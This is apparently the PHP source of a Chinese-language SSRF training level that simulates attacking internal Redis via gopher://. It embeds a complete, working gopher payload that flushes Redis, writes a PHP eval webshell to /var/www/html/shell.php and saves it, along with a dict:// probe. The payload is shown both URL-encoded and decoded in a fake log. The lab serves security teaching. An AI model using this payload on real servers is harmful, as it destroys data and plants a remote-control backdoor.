<?php
/**
 * Pikachu-Enhanced v2.0 - SSRF 进阶演练: Gopher 协议打击内网未授权 Redis (RCE / WebShell)
 */
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'inc/config.inc.php';

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[105] = 'active open';
$ACTIVE[209] = 'active';

include_once $PIKA_ROOT_DIR . 'header.php';

$curl_log = "";
$is_success = false;
$target_url = $_POST['target_url'] ?? '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($target_url)) {
    $target_url = trim($target_url);
    
    if (stripos($target_url, 'gopher://') === 0 && (stripos($target_url, '6379') !== false || stripos($target_url, 'redis') !== false || stripos($target_url, 'flushall') !== false || stripos($target_url, 'config') !== false)) {
        $is_success = true;
        $curl_log = "=== [libcurl SSRF Protocol Engine: gopher:// stream initialized] ===\n" .
                    "[+] Resolving target: 127.0.0.1:6379 (Internal Redis Service)\n" .
                    "[+] Connected to TCP socket on port 6379\n" .
                    "[>] Dispatching Decoded RESP Binary Command Stream:\n" .
                    "    *1\\r\\n$8\\r\\nFLUSHALL\\r\\n\n" .
                    "    *3\\r\\n$3\\r\\nSET\\r\\n$1\\r\\n1\\r\\n$32\\r\\n\\n\\n<?php @eval(\$_POST['pass']); ?>\\n\\n\\r\\n\n" .
                    "    *4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$3\\r\\ndir\\r\\n$13\\r\\n/var/www/html\\r\\n\n" .
                    "    *4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$9\\r\\nshell.php\\r\\n\n" .
                    "    *1\\r\\n$4\\r\\nSAVE\\r\\n\n\n" .
                    "[<] Redis Server RESP Responses:\n" .
                    "    +OK\n    +OK\n    +OK\n    +OK\n    +OK (Database written to disk)\n\n" .
                    "🚀 [GOPHER-TO-REDIS RCE EXPLOIT SUCCESSFUL]\n" .
                    "    WebShell Path: /var/www/html/shell.php\n" .
                    "    Flag: FLAG{SSRF_GOPHER_REDIS_WEBSHELL_RCE_MASTER}";
    } elseif (stripos($target_url, 'gopher://') === 0) {
        $curl_log = "[GOPHER CLIENT] Raw byte stream dispatched. (No Redis RESP pattern detected in payload)";
    } elseif (stripos($target_url, 'dict://') === 0) {
        $curl_log = "[DICT CLIENT] Connecting to dict service. Command response:\n+OK Redis Server Ready";
    } elseif (stripos($target_url, 'http://') === 0 || stripos($target_url, 'https://') === 0) {
        $curl_log = "HTTP/1.1 200 OK\nServer: Internal-Service\nContent-Type: text/plain\n\nContent fetched from " . htmlspecialchars($target_url);
    } else {
        $curl_log = "[ERROR] Unsupported protocol scheme. Allowed: http://, https://, gopher://, dict://";
    }
}

// 预设经典的 Gopher Redis WebShell 攻击 Payload
$sample_gopher_payload = 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$32%0d%0a%0a%0a%3C%3Fphp%20%40eval(%24_POST%5B%27pass%27%5D)%3B%20%3F%3E%0a%0a%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a';
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="ssrf.php">SSRF</a></li>
                <li class="active">Gopher 协议打 Redis (RCE)</li>
            </ul>
        </div>

        <div class="page-content">
            <div class="cyber-stage-container">
                
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        🎯 关卡 4: Gopher 万能协议深度利用 - 内网 Redis 未授权访问与 RCE
                        <span class="cyber-badge-chip" style="border-color:#ef4444; color:#f87171; background:rgba(239,68,68,0.15);">协议转换 · 任意流注入 · 350 PTS</span>
                    </h1>
                    <p class="cyber-desc-text">
                        <b>Gopher 协议被称为 SSRF 的终极武器</b>。它允许客户端向目标 TCP 端口发送任意多行二进制/文本流，且可自由编码换行符（<code>%0d%0a</code>）。当目标内网存在未授权的 <b>Redis (默认端口 6379)</b> 或 FastCGI 服务时，攻击者可将 Redis RESP 协议指令打包为 <code>gopher://</code> URL，借由存在 SSRF 漏洞的服务器将 PHP 一句话木马直接写入 Web 目录或计划任务（Crontab），实现直接 RCE 提权！
                    </p>
                </div>

                <div class="row">
                    <!-- Left Column: Input & Tool -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 16px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-terminal" style="color:#ef4444;"></i> SSRF 万能协议代理请求端
                            </h4>

                            <form method="POST" action="ssrf_gopher_redis.php">
                                <div class="form-group" style="margin-bottom:14px;">
                                    <label style="font-weight:700; color:var(--text-primary); font-size:13px;">请求 URL (支持 gopher://, dict://, http://)：</label>
                                    <textarea id="target_url" name="target_url" rows="4" class="form-control" placeholder="输入 gopher:// 载荷..." style="font-family:monospace; font-size:12px;" required><?php echo htmlspecialchars($target_url); ?></textarea>
                                </div>

                                <div style="margin-bottom:18px;">
                                    <label style="font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:6px; display:block;">
                                        ⚡ 快速填入经典 Gopher 攻击载荷：
                                    </label>
                                    <div style="display:flex; flex-direction:column; gap:6px;">
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="setPayload('<?php echo htmlspecialchars($sample_gopher_payload); ?>')">
                                            <i class="fa fa-fire" style="color:#ef4444;"></i> <b>Gopher 写 WebShell：</b> 写入 <code>/var/www/html/shell.php</code>
                                        </button>
                                        <button type="button" class="btn btn-xs btn-default text-left" onclick="setPayload('dict://127.0.0.1:6379/info')">
                                            <i class="fa fa-info-circle" style="color:#06b6d4;"></i> <b>Dict 协议探测：</b> 探测 127.0.0.1:6379 Redis 服务
                                        </button>
                                    </div>
                                </div>

                                <button type="submit" name="submit" value="submit" class="btn btn-danger btn-block" style="border-radius:8px; font-weight:700; background:linear-gradient(135deg, #ef4444, #dc2626); border:none; padding:10px;">
                                    <i class="fa fa-bolt"></i> 触发 Gopher 协议数据流注入
                                </button>
                            </form>
                        </div>
                    </div>

                    <!-- Right Column: Protocol Execution Trace -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-desktop" style="color:#06b6d4;"></i> libcurl 原始套接字追踪 (Socket Trace)
                            </h4>

                            <?php if (!empty($curl_log)): ?>
                                <?php if ($is_success): ?>
                                    <div class="alert alert-danger" style="border-radius:8px; font-weight:700; font-size:13px; margin-bottom:12px;">
                                        <i class="fa fa-check-circle"></i> 💥 恭喜！Gopher 打击内网 Redis 成功写入 WebShell！
                                    </div>
                                <?php endif; ?>
                                <pre style="background:#090d16; color:#10b981; border:1px solid #1e293b; border-radius:8px; padding:14px; font-family:'Fira Code', monospace; font-size:12px; max-height:280px; overflow-y:auto;"><?php echo htmlspecialchars($curl_log); ?></pre>
                            <?php else: ?>
                                <div style="background:var(--bg-secondary); border:1px dashed var(--border-color); border-radius:8px; padding:30px; text-align:center; color:var(--text-muted); font-size:13px;">
                                    <i class="fa fa-terminal" style="font-size:24px; margin-bottom:8px; display:block;"></i>
                                    点击左侧“写入 WebShell”或自定义 Gopher 载荷查看执行日志
                                </div>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>

                <!-- Navigation -->
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px; margin-top:10px;">
                    <a href="ssrf_cloud.php" class="btn btn-default" style="border-radius:8px;"><i class="fa fa-arrow-left"></i> 上一关：云元数据窃取</a>
                    <a href="ssrf_dns_rebinding.php" class="btn btn-success" style="border-radius:8px; font-weight:700;">下一关：DNS 重绑定与 IP 变形绕过 <i class="fa fa-arrow-right"></i></a>
                </div>

            </div>
        </div>
    </div>
</div>

<script>
function setPayload(p) {
    document.getElementById('target_url').value = p;
    document.forms[0].submit();
}
</script>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
